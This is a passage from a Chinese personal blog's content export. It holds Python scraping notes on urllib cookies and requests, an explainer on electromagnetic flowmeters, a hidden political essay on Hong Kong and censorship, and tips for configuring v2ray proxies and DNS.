response <span class="token operator">=</span> opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="cookies">cookies</h5>
<p>使用HTTPCookiePorcesser()模块处理,使用MozillaCookieJar读写 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> http <span class="token keyword">import</span> cookiejar
filename <span class="token operator">=</span> <span class="token string">'cookie.txt'</span>
cookie <span class="token operator">=</span> cookiejar<span class="token punctuation">.</span>MozillaCookieJar<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
handler <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>HTTPCookieProcessor<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>
<span class="token comment"># 创建自定义opener</span>
opener <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>handler<span class="token punctuation">)</span>
<span class="token comment"># open方法打开网页</span>
response <span class="token operator">=</span> opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'https://movie.douban.com/'</span><span class="token punctuation">)</span>
<span class="token comment"># 保存cookie文件</span>
cookie<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 读取cookie</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h4 id="requests库">requests库</h4>
<p>主要参数url, 请求头信息headers, 是否开启证书验证verify,超时timeout, 代理proxies和cookies, 文件files(字典格式)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 格式</span>
<span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">'https://google.com'</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>'url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>'url<span class="token punctuation">,</span> data<span class="token operator">=</span> data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="等待填坑">等待填坑</h4>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>电磁流量计</title>
    <url>/8ca1/</url>
    <content><![CDATA[<p>电磁流量计是一种常用流速流量计，应用电磁感应原理， 根据导电流体通过外加磁场时感生的电动势来测量导电流体流量的一种仪器。电磁流量计适用于满管污水等强导电性液体流量测量，多用于工业污水检测等场合。 <a id="more"></a></p>
<h4 id="电磁流量计原理">电磁流量计原理</h4>
<p>常用流速流量计有测量导电液体的电磁流量计、采用超声波流量计时差法外夹式或者管段式超声波流量仪表、采用多普勒雷达测速原理或利用声波在流体中传播的多普勒效应的流速仪。</p>
<p>电磁流量计（Electromagnetic Flowmeters，简称EMF），是20世纪50~60年代随着电子技术的发展而迅速发展起来的流量测量仪表。 电磁流量计是应用电磁感应原理， 根据导电流体通过外加磁场时感生的电动势来测量导电流体流量的一种仪器。</p>
<p>传统电磁流量计测量原理如图1所示。 电磁线圈在直径为 d、横截面积为A的管道中产生一个磁场强度为B的磁场。当有流体经过 时会切割磁感线而产生感应电动势 U,测量电极接收电动势信号。由公式 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.798ex" xmlns="http://www.w3.org/2000/svg" width="12.195ex" height="2.835ex" role="img" focusable="false" viewBox="0 -900.3 5390.1 1253.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="mo" transform="translate(1068.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2124.6, 0)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(227.4, 394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(220, -345) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><rect width="568.4" height="60" x="120" y="220"></rect></g></g><g data-mml-node="mo" transform="translate(3155.2, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3877.4, 0)"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220, 394) scale(0.707)"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(767, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="mrow" transform="translate(304.1, -345) scale(0.707)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(759, 0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><rect width="1272.7" height="60" x="120" y="220"></rect></g></g></g></g></svg></mjx-container></span> 可计算其流量。式中:Q为流量;k为修正系数。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830182933.png" alt="传统流量计"></p>
<p>电容式电磁流量计解决了电极表面附 着、腐蚀、摩擦等问题 ,其电极与被测流体间有绝缘 衬里隔离,或者直接采用绝缘测量管, 结构如图 2 所示。电极与被测流体通过绝缘管形成检测电容,通 过此电容来耦合流量信号。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183016.png" alt="对比"></p>
<h4 id="电磁流量计的优化改进">电磁流量计的优化改进</h4>
<p>普通的电磁流量计只能测量满管流的流量,常见的非满管电磁流量计有下面几种：</p>
<ol type="1">
<li>多电极式非满管电磁流量计。其底部是一对信号注入电极,中间有多对测量电极,顶端有一个满管电极。当流体非满管时,满管电极检测到管道非满状 态,利用算法修正测量值,此时流量计的测量方式改 成测量流体流速和液面高度。信号注入电极与在不同位置的三对测量电极共同工作,用于测量液位面的高度和流体的速度。</li>
<li>电容式非满管电磁流量计。电容式非满管电磁流量计就是利用液位的变化使 得电容的极距发生变化,通过测量发送电极和检测电 极之间的电容耦合值即可测量流量值。</li>
<li>利用阻抗或信号衰减研制的非满管电磁流量计。其结构是流量管底部贴一对信号发射电极,在流量管中间贴信号接收电极。由于信号在流体 中传播会产生衰减,且传播时间越长,衰减越多,因此 通过信号接收电极接收到的信号衰减量即可得知液面高度; <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183034.png"> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183044.png"> 励磁方式可以分为两种基本 形式,即采用交变磁场的形式(包括正弦波励磁、矩形 波励磁、三值波励磁和双频矩形波励磁) 和采用恒定 磁场的形式(包括直流电源励磁和永磁体励磁)。</li>
</ol>
<p>相对于交变磁场励磁方式来说,恒定磁场励磁的 方式实现起来更加简单,受工频干扰影响小,而且使用 恒定磁场励磁可以简化传感器结构</p>
<h4 id="电磁流量计与其他测流量原理仪器的比较">电磁流量计与其他测流量原理仪器的比较</h4>
<table>
<colgroup>
<col style="width: 21%">
<col style="width: 15%">
<col style="width: 21%">
<col style="width: 21%">
<col style="width: 21%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">产品名称</th>
<th style="text-align: left;">原理</th>
<th style="text-align: center;">优点</th>
<th style="text-align: center;">缺点</th>
<th style="text-align: center;">备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">电磁流量计</td>
<td style="text-align: left;">电磁感应</td>
<td style="text-align: center;">适合满管污水测量</td>
<td style="text-align: center;">不能测非满管污水和干净的水体</td>
<td style="text-align: center;">多适用于工业污水处理等场合，管径不同价格不同</td>
</tr>
<tr class="even">
<td style="text-align: left;">超声波流量计时差法</td>
<td style="text-align: left;">超声波时差</td>
<td style="text-align: center;">适合于干净水体的流量测量可以外贴在管道外侧</td>
<td style="text-align: center;">不能测非满管污水和中污以上的水体</td>
<td style="text-align: center;">多适用于供水等场合</td>
</tr>
<tr class="odd">
<td style="text-align: left;">超声波明渠流量计</td>
<td style="text-align: left;">水位换算流量</td>
<td style="text-align: center;">价格便宜，原理简单</td>
<td style="text-align: center;">需要修建堰槽且 对；水体有阻碍作用、精度较低</td>
<td style="text-align: center;">适合于小渠道等能够修建堰槽的场合，宽渠道或者非规则渠道无法使用</td>
</tr>
<tr class="even">
<td style="text-align: left;">雷达流速仪</td>
<td style="text-align: left;">多普勒效应</td>
<td style="text-align: center;">安装简单不易损坏</td>
<td style="text-align: center;">起始速度较高，无法测量流速较慢的水体，由于测量水表面的流速，容易受波浪影响</td>
<td style="text-align: center;">适合大江大河等流速较大或者安装要求简便的场合</td>
</tr>
<tr class="odd">
<td style="text-align: left;">多普勒超声流量计</td>
<td style="text-align: left;">多普勒效应</td>
<td style="text-align: center;">测量精度高，起始速度低，安装简便，能够测量非满管和不规则断面的流速流量</td>
<td style="text-align: center;">较宽的渠道需要多台设备同时使用</td>
<td style="text-align: center;">城市下水道、管网、灌区、河道、渠道水电站等</td>
</tr>
</tbody>
</table>
<h4 id="参考">参考</h4>
<ol type="1">
<li>AMARE T. Design of an electromagnetic flowmeter for insulating liquids[ J]. Measurement Science &amp; Technology, 1999, 10 ( 8 ): 755 - 758.</li>
<li>DONEY B. Going with partial flow[ J]. Control Engineering,1998, 45(12):131 - 133.</li>
<li>BERA, S. C., CHAKRABORTY, B.. A Novel Technique of Flow Measurement for a Conducting Liquid[J]. IEEE Transactions on Instrumentation and Measurement,2009,8(8).</li>
</ol>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>传感器</tag>
        <tag>电磁流量计</tag>
      </tags>
  </entry>
  <entry>
    <title>皇后大道东</title>
    <url>/93c2/</url>
    <content><![CDATA[<p>知己一声拜拜远去这都市... 梦醒,却不是2008</p>
<div style="display: none">
<h4 id="皇后大道中人民如潮涌">皇后大道中人民如潮涌</h4>
<p>皇后大道中为何无皇宫？ <a id="more"></a> 七十年前收惶恐是顺手的事，执意攻台却对港澳装聋作哑，不收，故意留个洗钱和走私的通道<br />
惶恐至今仍是大陆重要的的洗钱出逃通道<br />
惶恐高房价高地租早就榨干了平民，倒是没见诸位市民群情激愤搞出这么大的抵制。<br />
这次一群人跑出来，自由民主神圣事，骗了无涯过客，这才过去几年呐，都忘啦<sub>不长记性</sub> 反了反了，走错了，南辕北辙 惶恐金融地位的衰落目前看来早晚的事，金融中心地位不保<br />
散步卵用没有，雷声大雨点小<br />
痴人说梦<br />
都远不如集体抛港币做空港股之类的来得实在<br />
然而<br />
真爱故土的，被视为乱臣贼子，而背弃故土，随时准备出逃的，被视为爱国正能量，神州如此，惶恐也是如此。走上街头的，其实坚守惶恐的基本盘，而高调爱国，呼吁稳定的，则是挤兑港币的急先锋<br />
汇率是个大杀器，现在是，将来也是，软妹币撑不住前都是 调控，又叫操纵市场</p>
<h4 id="衰兰送客咸阳道天若有情天亦老">衰兰送客咸阳道，天若有情天亦老</h4>
<p>君子之泽，五世而斩，现在时间过的快，可能只需要十年。 苏联有笑话传世，而此地见白色荒漠，一眼看去，403forbidden</p>
<p>贡当斯： &gt; &gt;“让我们想像一个靠几代人的勤奋劳动富裕起来、在科学和艺术方面都取得了巨大进步的文明民族。如果权力在思想表达和精神活动方面设置障碍，那个民族在一段时间内，还可以靠它过去的老本生活，也就是说，靠继承下来的文明成果生活。但是将不再有观念的更新；它们的再生能力将会枯竭。用不了几年，虚荣心就会取代对知识的热爱。那些想起了以往文学作品所赢得的荣耀和敬意的诡辩家，将会致力于写作徒有其表的同类作品。他们会以自己的作品反对其他作品表现出的优点；而且只要哪里还有自由主义原则的踪迹，哪里就会出现某种文学运动，出现反对这些作品和原则的斗争。但这种运动本身也是已被摧毁的自由的遗产。一俟这种自由的最后痕迹和最后传统销声匿迹，战斗就会结束，因为作战者将再也看不见任何敌人，而胜利者和被征服者会同样保持沉默。</p>
<blockquote>
<p>的确，谁知道权力会不会断定强制沉默是有好处的？实际上，它们不愿意看到逝去的记忆得到复活，放弃的怀疑再被挑起。它们将压制过于热情的追随者，就像曾经压制它们的敌人一样。它们会禁止所有人以人类为主题进行写作，就像某个虔诚的政府禁止任何人谈论上帝，无论坏话好话都不许说一样。它们会宣布人们在哪些问题上可以使用自己的头脑：它会获准自我消遣，但要处在监督之下，并在规定的范围之内；如果它试图偏离对它的限制，如果它拒不与自己的神圣起源断绝关系，继续从事受到禁止的思考，如果它鲁莽地认为，自己的最高贵的目的不是对琐碎题目做精巧的修饰，不是圆滑的阿谈奉承，不是毫无内容的夸夸其谈，而是上天和它的本性要它成为一个永恒的法庭，在这里对一切事物进行分析、检验并做出最终的判断，它就会惹来诅咒。因而，名副其实的思想历程肯定会被终止。文明的一代将逐渐消失；随之而来的一代，由于看到追求知识没有任何好处，甚至从中看到了威胁，将会不可挽回地远离知识的追求。</p>
</blockquote>
<blockquote>
<p>　　你会说，人的头脑仍然可以在消遣文学中发光，可以专注于精密的自然科学，还可以致力于工艺。然而这都是废话。大自然在创造人类的时候并没有向权力请教；它规定我们所有的天赋应当紧密地结合在一起，其中任何一个受到压制都会损害其他。甚至对消遣文学、科学和工艺而言，独立思考就像空气对自然界的生命一样，也是必不可少的。有人大可把人们置于一台气泵下劳动，争辩说他们没有被迫呼吸，只是在运动自己的胳臂和双腿，让头脑只运用于规定的目标，阻止它去思考那些能够唤起自己的尊严，从而给予它活力的许多重要事物。于是，被压抑的作家开始歌功颂德；但是，他们甚至连阿泱奉承的能力都会逐渐衰退，文学最终会丧身于字谜游戏和藏头诗之中。博学之土变成了纯粹的古董收藏家，而即使是这些古董，也会在被镣铐束缚着的手中退化和贬值。艺术家天才的源泉会同哺育自由的惟一手段——对荣耀的向往——一起日渐枯萎；由于他们以为可以孤立存在的事物之间有着某种神秘但却无可争辩的联系，那么人的灵魂一旦受到贬损，他们也就不再具有高尚地描绘人类面貌的天赋了。 　　... 　　...</p>
</blockquote>
<blockquote>
<p>　　思想乃万事之本：工业，兵法，以及所有的科学和艺术，都需要运用思想。它是它们进步的原因，通过对这种进步的分析，它也开阔了自己的眼界。如果专横权力试图束缚它，道德观念就会不再健康，实用知识就会不再精确，科学发展就会不再活跃，兵法就会不再进步，工业也不会再有新的发现而繁荣。</p>
</blockquote>
<blockquote>
<p>　　人类生活最高尚的部分如果受到攻击，很快就会感觉到这种毒害作用逐渐向最遥远的地方蔓延。你以为你只是剥夺了它某些多余的自由，或者删除了某些无用的虚饰，实际上你那有毒的武器正好戳到了它的心脏。 　　......</p>
</blockquote>
<blockquote>
<p>　　各民族历史变迁的真正原因是，人类的思想不可能保持静止不动。如果你不阻挠它，它就会前进；如果你阻挠它，它就会倒退；如果你使它失去信心，它将不再为任何目标进行不知疲倦的操劳。几乎可以说，人类的思想看到自己被排挤出适得其所的地方而感到愤慨，它要通过一次高贵的制裁，为它所蒙受的耻辱复仇。 　　......</p>
</blockquote>
<blockquote>
<p>　　首先，维持一种完全人为的能动性，代价极大。当人人都处于自由状态时，每个人都会兴致勃勃地去做、去说、去写。但是当大多数国民成为被迫保持沉默的旁观者时，为了诱使这些旁观者鼓掌欢呼，或者只是简单地观望，指挥演出的人必须依靠戏剧性情节和场景的转换来刺激他们的好奇心。</p>
</blockquote>
<blockquote>
<p>　　同时，这种人为的煽动比现实更煞有介事。一切都在运动，但只是迫于命令和威胁；一切都不顺畅，因为没有什么是自发的。人们对政府不是追随，而是服从。所有的车轮遇到最微小的阻碍都会停止转动。这就像下棋一样：权力之手伸向棋子，没有一粒棋子会进行反抗；但是如果那条胳臂停止挥舞，所有的棋子都会呆在原地一动不动。</p>
</blockquote>
<blockquote>
<p>　　最后，如果一个民族死气沉沉，那么无论政府有什么作为，都不会得到舆论的响应。它不能使国民保持清醒，只好与国民一起进入梦乡。因而，在一个思想被禁锢的民族中，一切都无声无息，一切都在沉沦，一切都在退化和堕落。这样一个帝国早晚会出现埃及平原上的景象，在那里，人们会看到巨大的金字塔静立于贫瘠的地面，统治着寂静的沙漠。” ......</p>
</blockquote>
<blockquote>
<p>　　因而，在一个思想被禁锢的民族中，一切都无声无息，一切都在沉沦，一切都在退化和堕落。这样一个帝国早晚会出现埃及平原上的景象，在那里，人们会看到巨大的金字塔静立于贫瘠的地面，统治着寂静的沙漠。 <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830184422.jpg" alt="picture"/> 等一个新闻联播大结局</p>
</blockquote>
<h4 id="天朝十八怪">天朝十八怪</h4>
<p><del>来自好友干干</del><br />
天朝十八怪： 新闻不把评论开， 自由言论皆有害， 文盲最爱掉书袋, 昨天打仗今恋爱， 记者全球跑最快， 斗争对内不对外， 万里火墙永不坏， 全民外援勒腰带， 让生几胎生几胎， 老少边穷吸人才， 国外反华心眼坏， 小孩倒比大人乖， 上梁永远不会歪， 战舰出海去买奶， 未有人祸全天灾， 战狼战友被强拆， 富贵夫妻百事哀， 太平洋上没锅盖， 有关部门随你猜，</p>
<h4 id="谁活着谁看见">谁活着，谁看见</h4>
<p>君不见，李一男，备胎不过是弃子。 你我不如等一个新闻联播大结局， 君不见，玁狁孔棘 啊，朋友再见！</p>
<h4 id="祝衮衮诸公头颅安好">祝衮衮诸公，头颅安好</h4>
<p>维尼修仙，折煞了，满朝文武。 看京都，风雨飘摇，再无朗月。 二百斤麦子扛得住，莎士比亚看点书。 再连任，做了真皇帝，也彳亍。 大犬刁，要撒币。吃点土，还要住。 看河山，喂饱十四亿饥畜。 亦有大盗如习主，八十三天犹在目。 会以目，大坝崩渝水，心犹怵。</p>
<hr />
<p>更新：皇后大道东在局域网喜迎全网下架 更新：好消息好消息，人间道下架，罗大佑东方之歌和黄霑作词的我的中国心入选70周年百大歌曲，到底想怎样嘛 更新：孙小果和怀化事件人心散了啊，打黑打不出当年反腐的舆论效果了啊，压不住可是要出乱子的。当年90年代和二十一世纪初车匪路霸横行的年代，我还小，不记得了，现在怕是又来了。 自古皇权不下乡，深圳孙志刚那时也就跟现在湖南差不多，乡贤回潮，欢迎来到六镇之乱和两脚羊的世界。</p>
<h4 id="推荐阅读">推荐阅读</h4>
<p><span class="exturl" data-url="aHR0cHM6Ly90Lm1lL2FudGlleHRyYWRpdGlvbnZlcmlmaWVkbmV3cw==">反送中已核實資訊頻道<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG91YmFuLmNvbS9ub3RlLzcyMzUwNDU2My8=">请收起你的厌港症<i class="fa fa-external-link-alt"></i></span> 更新：该文章喜提和谐，<span class="exturl" data-url="aHR0cHM6Ly90ZXJtaW51czIwNDkuZ2l0aHViLmlvL2FyY2hpdmUvMjAxOS8wNi8yMy9kaXNncmVlLWFib3V0LWhrLmh0bWw=">备份地址<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly90ZXJtaW51czIwNDkuZ2l0aHViLmlvL2FyY2hpdmUvMjAxOC8xMC8zMC9NaW5nLVBhby5odG1s">1962:进击的明报<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU5JTgwJTgzJUU2JUI4JUFG">大逃港<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BsZXVuZ2thaWNoaWhrLyVFNSU4RiU4RCVFOSU4MCU4MSVFNCVCOCVBRCVFNyVBRCU5NCVFNSU5NSU4RiVFOSU5QiU4Ni05ODQxOTc0ZDg4OWM=">问答集<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9xei5jb20vMjc5MDEzL3RoZS1zZWNyZXQtaGlzdG9yeS1vZi1ob25nLWtvbmdzLXN0aWxsYm9ybi1kZW1vY3JhY3kv">往事<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BsZXVuZ2thaWNoaWhrLyVFOSVBNiU5OSVFNiVCOCVBRiVFNyVBQyVBQyVFNCVCOCU4MCVFOCVBQSVCMi05NDg2YmI0NDM4MWE=">香港第一课<i class="fa fa-external-link-alt"></i></span> 这一系列写得同样很偏激，但你可以从这里看到部分港人内心的想法 <span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTHhwRkxySTItVHFGVGxlbS10M1FoZw==">香港学生会是个什么会<i class="fa fa-external-link-alt"></i></span> <blockquote class="blockquote-center">
<p>We think what we see. We be what we think. Secrecy makes us blind. Conformism redacts thoughts. Together they limit human grandeur.</p>

</blockquote></p>
</div>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
      <tags>
        <tag>杂记</tag>
      </tags>
  </entry>
  <entry>
    <title>网上冲浪指北</title>
    <url>/87d6/</url>
    <content><![CDATA[<p>欢 度 国 庆 <a id="more"></a></p>
<h2 id="时隔一年的更新">时隔一年的更新</h2>
<p>由于这一篇写的太乱，我重新开了个坑，见<a href="https://zhangjk98.xyz/surfing-the-internet-2/">网上冲浪指北（二）</a>。这一篇已经过时，不用再看了。</p>
<h2 id="近况">近况</h2>
<p>听说9月16号风雨交加,电闪雷鸣，好多梯子集体。AWS的ip据说都被封了一批。 使用v2ray的我依然苟活，我这一阵使用体验是，ws+tls+cdn是最稳的。嫌麻烦可以直接ws，反正不建议v2ray用http伪装了，容易被制裁。最近我的MTproto也挂了，貌似最近telegram的专用代理被针对得很厉害。 另外建议避开美日港等线路。 备用应急找几个还勉强能用的备着，比如setup v某n</p>
<p>更新,kcptun,mkcp,finalspeed . GIA线路最好不要用。 最近ss和ssr大面积爆破，v2ray还能苟，不行直接上trojan。 使用aes加密基本都被搞，好像是ssr有混淆，墙无法识别，直接封。 祝你ping安</p>
<p>还是要保持优良传统,努力学习<del>元件耦合</del>计算机网络: &gt;大一的电路分析老师曾说过：“在文化大革命的时候，国家曾封锁电台。我们的同学们啊用自己的器件组装了一个电台，他能覆盖整个四川地区甚至云南和贵州也能收到。于是四川人民天天就听着成电广播，后来这事闹大了，办电台的同学要被批斗，还是周总理亲自来把这事压下去了。能做出那么好的电台，是元件耦合做得好，同学们，可见元件耦合有多么重要啊！”</p>
<p>另，移动网经常搞些dns劫持之类的动作，会造成一些干扰，我们参照这个配置 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3YycmF5L3YycmF5LWNvcmUvaXNzdWVzLzE4MDg=">https://github.com/v2ray/v2ray-core/issues/1808<i class="fa fa-external-link-alt"></i></span> 改一下服务器dns配置：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"dns"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
<span class="token property">"server"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
<span class="token string">"8.8.8.8"</span><span class="token punctuation">,</span>
<span class="token string">"1.1.1.1"</span><span class="token punctuation">,</span>
<span class="token string">"localhost"</span>
<span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
